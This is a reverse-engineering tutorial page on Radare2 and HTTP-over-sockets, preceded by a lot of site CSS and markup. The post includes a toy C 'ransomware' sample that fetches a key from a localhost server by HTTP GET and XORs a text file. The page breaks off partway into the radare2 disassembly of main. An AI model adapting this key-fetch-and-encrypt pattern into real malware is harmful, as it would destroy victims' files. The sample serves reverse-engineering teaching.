.subscribe-button{position:absolute;top:10px;right:10px;height:40px;padding:0 15px;font-size:14px}@media only screen and (max-width: 1130px){.widget-subscribe .subscribe-form .subscribe-email{font-size:13px}.widget-subscribe .subscribe-form .subscribe-button{font-size:14px}}.copyright{padding:0 0 30px;margin-top:10px;font-size:13px;font-weight:500;text-align:center;color:#ccc}.copyright a:hover{color:#0070ff}@media only screen and (max-width: 768px){.copyright{text-align:left}}.gallery-box{margin:40px 0}.gallery-box.gallery-footer{margin:0}.gallery-box em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}.gallery-box em a{border-bottom:1px solid #fff}.gallery-box em a:hover{color:#fff;border-color:#0070ff}.gallery{display:grid;grid-template-columns:repeat(3, auto);justify-content:center;align-content:center;grid-gap:10px}.gallery .gallery__image{background:#131212}.gallery .gallery__image img{display:block;width:100%;height:auto;object-fit:cover}.social{margin:60px 0 0;text-align:center}.social .social__list{display:flex;justify-content:center;align-items:center;flex-wrap:wrap}.social .social__item{display:inline-block;margin:0 2px}.social .social__link{position:relative;z-index:1;padding:0 10px;font-size:21px;line-height:1}.social .social__link:hover{color:#fff}.social .social__link:hover::after{transform:translate3d(-50%, -50%, 0) scale(1)}.social .social__link::after{content:'';display:block;position:absolute;z-index:-1;top:50%;left:50%;transform:translate3d(-50%, -50%, 0) scale(0);width:100%;height:0;padding-bottom:100%;border-radius:50%;background:#0070ff;transition:all .25s}@media only screen and (max-width: 768px){.social{margin:50px 0 0;text-align:left}.social .social__list{justify-content:start}}.hero{padding:60px 0 70px;margin-bottom:70px;background:#161d25}.hero.hero--post .article__meta{margin-bottom:13px;font-size:14px;font-weight:500}.hero.hero--post .article__meta .article__date::before{content:none}.hero.hero--post .article__author-link{font-size:14px;line-height:20px;font-weight:500;color:#ccc}.hero.hero--post .article__author-link span{color:#ccc}.hero.hero--post .article__author-link:hover{color:#fff}.hero.hero--page .hero__title{margin-bottom:0}@media only screen and (max-width: 768px){.hero{padding:60px 0 60px;margin-bottom:60px}}@media only screen and (max-width: 576px){.hero{padding:40px 0 40px;margin-bottom:40px}}.hero__inner{display:flex;align-items:center}@media only screen and (max-width: 768px){.hero__inner{flex-direction:column}}.hero__left,.hero__right{width:50%}@media only screen and (max-width: 768px){.hero__left,.hero__right{width:100%}}.hero__left .hero__title,.hero__left .hero__job{font-size:50px;font-weight:700;letter-spacing:-2px;color:#fff}@media only screen and (max-width: 1130px){.hero__left .hero__title,.hero__left .hero__job{font-size:40px;line-height:1.2}}@media only screen and (max-width: 1024px){.hero__left .hero__title,.hero__left .hero__job{font-size:33px}}@media only screen and (max-width: 576px){.hero__left .hero__title,.hero__left .hero__job{font-size:27px}}.hero__left .hero__title{margin-right:20px;margin-bottom:10px}@media only screen and (max-width: 768px){.hero__left .hero__title{margin-right:0}}.hero__left .hero__job{margin-bottom:20px}.hero__left .hero__name{position:relative;font-weight:400}.hero__left .hero__name::after{content:"";position:absolute;left:0;bottom:0px;width:100%;height:38%;background-color:rgba(0,112,255,0.1)}.hero__left .hero__description{max-width:550px;margin:0;font-size:21px;font-weight:500;color:#ccc}@media only screen and (max-width: 1024px){.hero__left .hero__description{font-size:16px;line-height:26px}}.hero__left .hero__button{margin-top:20px;padding-right:12px;display:inline-block;font-size:16px;line-height:16px;font-weight:700;color:#fff;outline:none;cursor:pointer;transition:all 0.35s}.hero__left .hero__button:hover{color:#fff;background:#0065e6}.hero__left .hero__button .button-arrow{display:inline-block;margin-right:10px;width:30px;height:30px;line-height:30px;text-align:center;color:#fff;background:#0070ff}.hero__right{position:relative}.hero__right::after{content:"";position:absolute;top:50%;transform:translateY(-50%);display:block;width:100%;height:50%;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.hero__right .hero__image{position:relative;z-index:10;width:370px;height:470px;margin:0 auto}.hero__right .hero__image::before{content:"";display:block;position:absolute;top:0;z-index:1;width:100%;height:100%;background:#131212}.hero__right .hero__image img{position:absolute;top:0;z-index:1;height:100%;width:100%;object-fit:cover;box-shadow:10px 10px 0 #0070ff;background:#131212}@media only screen and (max-width: 1130px){.hero__right .hero__image{width:270px;height:370px}}@media only screen and (max-width: 1024px){.hero__right .hero__image{width:230px;height:330px}}@media only screen and (max-width: 768px){.hero__right{order:-1}.hero__right .hero__image{width:100%;height:330px;margin-bottom:40px}}@media only screen and (max-width: 576px){.hero__right .hero__image{height:270px;margin-bottom:30px}.hero__right .hero__image img{box-shadow:none}}.contact-head{margin-bottom:30px}.form-box{max-width:750px;margin:0 auto}.form__group{margin-bottom:20px}.form__group:last-child{margin-bottom:0}.form__input{width:100%;padding:20px;font-size:14px;font-weight:500;border:1px solid #131212;outline:none;transition:250ms;resize:vertical;color:rgba(255,255,255,0.8);background:#161d25}.form__input::placeholder{color:rgba(255,255,255,0.8)}.form__input:focus{border:1px solid #0070ff}.article{margin-bottom:30px;border-radius:3px;overflow:hidden;transition:transform .2s}.article:hover{transform:translateY(-3px)}.article__inner{box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.image-wrap{padding:15px 15px 0 15px;background:#161d25}.article__image{position:relative;display:block;height:0;padding-bottom:56.25%;background:#131212;overflow:hidden}.article__image img{position:absolute;width:100%;height:100%;object-fit:cover}.article__content{padding:25px;background:#161d25}.article__title{margin-bottom:10px;font-size:22px;line-height:32px}.article__title a:hover{color:#fff}.article__excerpt{font-size:15px;line-height:24px;font-weight:500;margin-bottom:20px;color:#ccc}.article__meta{display:flex;align-items:center;flex-wrap:wrap;margin-bottom:10px;font-size:13px;font-weight:500;line-height:20px}.article__meta .article__author-link{color:#ccc}.article__meta .article__author-link:hover{color:#fff}.article__meta .article-tags__box{display:flex}.article__meta .article-tags__box::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}.article__meta .article-tags__box .article__tag{color:#ccc}.article__meta .article-tags__box .article__tag:hover{color:#fff}.article__meta .article-tags__box .article__tag::after{content:",";display:inline-block;margin:0 2px}.article__meta .article-tags__box .article__tag:last-child::after{content:none}.article__meta .article__date{color:#ccc}.article__meta .article__date::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}img[src$="centerme"]{display:block;margin:0 auto}.post,.page{max-width:850px;margin:0 auto;color:#fff}.post__content a,.page__content a{text-decoration:underline}.image-box{margin:40px 0}.post__share{margin:50px 0}.post__share .share__list{display:flex;justify-content:center;align-items:center;width:100%}.post__share .share__item{margin:0 2px;text-align:center}.post__share .share__link{display:block;padding:2px 12px;font-size:18px;color:#161d25}.post__share .share__link.share__facebook,.post__share .share__link.share__twitter,.post__share .share__link.share__linkedin,.post__share .share__link.share__pinterest{border:1px solid #131212;background:#161d25}.post__share .share__link.share__facebook:hover,.post__share .share__link.share__twitter:hover,.post__share .share__link.share__linkedin:hover,.post__share .share__link.share__pinterest:hover{color:#fff}.post__share .share__link.share__facebook{color:#3b5998}.post__share .share__link.share__facebook:hover{background:#3b5998}.post__share .share__link.share__twitter{color:#55acee}.post__share .share__link.share__twitter:hover{background:#55acee}.post__share .share__link.share__linkedin{color:#0077b5}.post__share .share__link.share__linkedin:hover{background:#0077b5}.post__share .share__link.share__pinterest{color:#bd081c}.post__share .share__link.share__pinterest:hover{background:#bd081c}@media only screen and (max-width: 576px){.post__share{margin:40px 0}}.post__navigation{display:flex;justify-content:space-between;margin-bottom:20px}.post__navigation .post__prev,.post__navigation .post__next{display:flex;width:48%;padding:25px;margin-bottom:30px;background:#161d25;box-shadow:0px 0px 20px rgba(0,0,0,0.05);transition:transform .2s}.post__navigation .post__prev:hover,.post__navigation .post__next:hover{transform:translateY(-3px)}.post__navigation .post__prev .prev__image,.post__navigation .post__prev .next__image,.post__navigation .post__next .prev__image,.post__navigation .post__next .next__image{position:relative;display:block;width:100px;min-width:100px;height:100px;background-color:#131212}.post__navigation .post__prev .prev__image img,.post__navigation .post__prev .next__image img,.post__navigation .post__next .prev__image img,.post__navigation .post__next .next__image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__navigation .post__prev .prev__image,.post__navigation .post__next .prev__image{margin-right:15px}.post__navigation .post__prev .next__image,.post__navigation .post__next .next__image{margin-left:15px}.post__navigation .post__prev .post__nav,.post__navigation .post__next .post__nav{display:inline-block;margin-bottom:5px;font-size:13px;line-height:1;font-weight:500;color:#ccc}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{margin-bottom:0;font-size:18px;line-height:24px}.post__navigation .post__prev .post__nav__title a:hover,.post__navigation .post__next .post__nav__title a:hover{color:#fff}.post__navigation .post__next{text-align:right;margin-left:auto;justify-content:flex-end}@media only screen and (max-width: 768px){.post__navigation{flex-wrap:wrap}.post__navigation .post__prev,.post__navigation .post__next{width:100%}.post__navigation .post__prev{margin-bottom:30px}.post__navigation .next__box{margin-left:auto}}@media only screen and (max-width: 576px){.post__navigation{margin-bottom:10px}.post__navigation .post__prev,.post__navigation .post__next{padding:20px}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{font-size:15px;line-height:20px}}.post__comments{padding:40px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);background:#161d25}@media only screen and (max-width: 576px){.post__comments{padding:30px}}.error{margin-bottom:30px;text-align:center}.error .error__title{margin-bottom:0;font-size:100px}.error .error__text{margin-bottom:20px;font-size:21px;color:#ccc}.error .error__button{line-height:45px}.tag{padding:70px 0;margin-bottom:70px;text-align:center;background:#161d25}.tag .tag__meta{font-size:16px;color:#ccc}.tag .tag__title{margin:0;font-size:50px}@media only screen and (max-width: 768px){.tag{padding:60px 0;margin-bottom:60px}}@media only screen and (max-width: 576px){.tag{padding:40px 0;margin-bottom:40px}}

  </style>
</head>

<body class="dark">

  

    <!-- begin header -->
<header class="header">
  <div class="container">
    <div class="row">
      <div class="header__inner col col-12">

        <div class="logo">
          <a class="logo__link" href="/">
          
            Artik Blue
          
          </a>
        </div>

        <nav class="main-nav">
          <div class="main-nav__box">
            <div class="nav__icon-close">
              <i class="ion ion-md-close"></i>
            </div>
            <div class="nav__title">Menu</div>
            <ul class="nav__list list-reset">
              <li class="nav__item">
                <a href="/" class="nav__link">Home</a>
              </li>
              
                
              
                
                  
                  <li class="nav__item">
                    <a href="/about/" class="nav__link">About</a>
                  </li>
                  
                
              
                
                  
                
              
                
                  
                  <li class="nav__item">
                    <a href="/reversing" class="nav__link">Reversing</a>
                  </li>
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
                
                  
                
              
            </ul>
          </div>
        </nav>

        <div class="nav-buttons">
          <i class="nav__icon nav__icon-menu ion ion-md-menu"></i>
          <i class="nav__icon nav__icon-search ion ion-md-search"></i>
        </div>

      </div>
    </div>
  </div>
  <div class="header__overlay"></div>
</header>
<!-- end header -->

<!-- begin search -->
<div class="search">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="search__box">
          <div class="search__group">
            <div class="search__close">
              <i class="ion ion-md-close"></i>
            </div>
            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="container__inner">
          <div class="row search-results-list" id="js-results-container"></div>
        </div>
      </div>
    </div>
  </div>

</div>
<!-- end search -->
    <!-- begin content -->
    <main class="content" aria-label="Content">
      <!-- begin wrapper-page -->
      <div class="wrapper-page">
        <!-- begin hero -->

<section class="hero hero--post">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="hero__inner">
          <div class="hero__left">
            

            <div class="article__meta">
              <span class="article__date"><time datetime="2020-06-05T00:01:35+02:00">05 Jun 2020</time></span>
              
              <div class="article-tags__box">
                
                  <a href="/tag/reversing" class="article__tag">reversing</a>
                
                  <a href="/tag/c" class="article__tag">c</a>
                
                  <a href="/tag/radare" class="article__tag">radare</a>
                
              </div>
              
            </div>

            <h1 class="hero__title">Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)</h1>
            <a href="/about/" class="article__author-link"><span>By</span> Artik Blue</a>

            
          </div>

          <div class="hero__right">

            
            <div class="hero__image">
              <img class="lazy" data-src="/images//radare2/radare2_17.png" alt="Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)">
            </div>

            

          </div>
        </div>
      </div>
    </div>
  </div>
</section>
<!-- end hero -->

<!-- begin post -->
<div class="container">
  <article class="post animate">

    <div class="post__content">
      <h3 id="performing-get-requests-with-unix-sockets">Performing get requests with UNIX sockets</h3>

<p>Sockets are the very fundamentals of networking in any operating system. You can be sure that many applications you daily use work with sockets on the inside eventhough they call custom made functions.</p>

<p>So any particular network protocol like HTTP or DNS can be “emulated” or better said, constructed over sockets, we only need to know about how it works, bout the format like specific headers, sizes, request-response schema and so to implement it with sockets. At the end we’ll just need to create a buffer and fill its bytes correctly then call write() over the specific socket right?</p>

<p>Today we’ll go over a very common protocol, HTTP. This protocol is used for www naviation, no news here but it is also (severely) used in malware for implementing command and control mechanisms.</p>

<p>Think for example about the average ransomware yes it may come with some crypto key hardcoded inside but on that case the thing won’t be very useful/dangerous cause the key would be easily extracted from the binary by the reverser and the decryption of files will be possible. But what if the key comes over the network under certain conditions and then is no more used? Then the only possibilty comes with intercepting all of the traffic, which may be difficult cause the program may use https or debugging/reading the progams memory while it is crypting and that is a thing the average user won’t probably do…</p>

<p>So in this following example I wrote a very simple program that will retrieve a 10 digit KEY from a remote server by performing an HTTP GET request and then use it to XOR a txt file on disk.</p>

<p><em>I need to say that I do not encourage you to write ransomware or any kind of malware, you may face legal consequences if you do it</em></p>

<p>Here’s the code:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt; 
#include &lt;fcntl.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define BSIZE 256
#define KSIZE 11
</span><span class="c1">// Lame sample routine for key extraction from an http response</span>
<span class="kt">void</span> <span class="nf">getKey</span><span class="p">(</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]){</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">kg</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ki</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span><span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">BSIZE</span> <span class="o">&amp;&amp;</span> <span class="n">kg</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span> <span class="sc">'&lt;'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'k'</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'&gt;'</span> <span class="p">){</span>

            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">KSIZE</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
                <span class="n">key</span><span class="p">[</span><span class="n">ki</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
                <span class="n">ki</span> <span class="o">=</span> <span class="n">ki</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="n">kg</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// Lame sample routine for byte array xor</span>
<span class="kt">void</span> <span class="nf">cryp</span><span class="p">(</span><span class="kt">char</span> <span class="n">key</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]){</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">KSIZE</span><span class="p">;</span> <span class="n">i</span> <span class="o">++</span><span class="p">){</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="c1">// open a file xor the content and dump it to another file</span>
<span class="kt">void</span> <span class="nf">crypFile</span><span class="p">(</span><span class="kt">char</span> <span class="n">file</span><span class="p">[],</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]){</span>

    <span class="kt">int</span> <span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">;</span> 
    <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
    <span class="n">infile</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="p">,</span> <span class="mo">0644</span><span class="p">);</span> 
    <span class="n">outfile</span> <span class="o">=</span> <span class="n">open</span> <span class="p">(</span><span class="s">"crypted.cry"</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buff</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">)){</span> 
        <span class="n">cryp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>

        <span class="n">write</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buff</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">close</span> <span class="p">(</span><span class="n">infile</span><span class="p">);</span> 
    <span class="n">close</span> <span class="p">(</span><span class="n">outfile</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
   <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">portno</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
   <span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">server</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="n">KSIZE</span><span class="p">];</span>
   <span class="kt">char</span> <span class="n">request</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"GET /sh HTTP/1.1</span><span class="se">\r\n</span><span class="s">User-Agent: nc/0.0.1</span><span class="se">\r\n</span><span class="s">Host: 127.0.0.1</span><span class="se">\r\n</span><span class="s">Accept: */*</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">;</span>
   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">BSIZE</span><span class="p">];</span>

   <span class="n">portno</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
   <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
   <span class="n">server</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">);</span>

   
   <span class="n">bzero</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">));</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
   <span class="n">bcopy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">,</span> <span class="n">server</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">portno</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>

   <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">getKey</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>

   <span class="n">crypFile</span><span class="p">(</span><span class="s">"sample.txt"</span><span class="p">,</span><span class="n">key</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>As you see the algorithm is simple, first we ask the remote server for the key, then the server will return a response containing data related to the status of the request like http headers and such, then the body will contain the k tagged key, so we’ll need to parse it, getKey will extract the key and tne crypFile will use it to xor the file in chunks of key size.</p>

<p>We start with the main function as usual:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273bc4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x55fa6e2738dd</span>
<span class="err">┌</span> <span class="mi">614</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_1b0h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x1b0</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_1a4h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x1a4</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_194h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x194</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_190h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x190</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_18ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x18c</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_188h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x188</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_180h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x180</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_17eh</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x17e</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_16bh</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x16b</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_160h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x160</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_158h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x158</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_150h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x150</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_148h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x148</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_140h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x140</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_138h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x138</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_130h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x130</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_128h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x128</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_120h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x120</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_118h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x118</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_114h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x114</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_110h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x110</span>
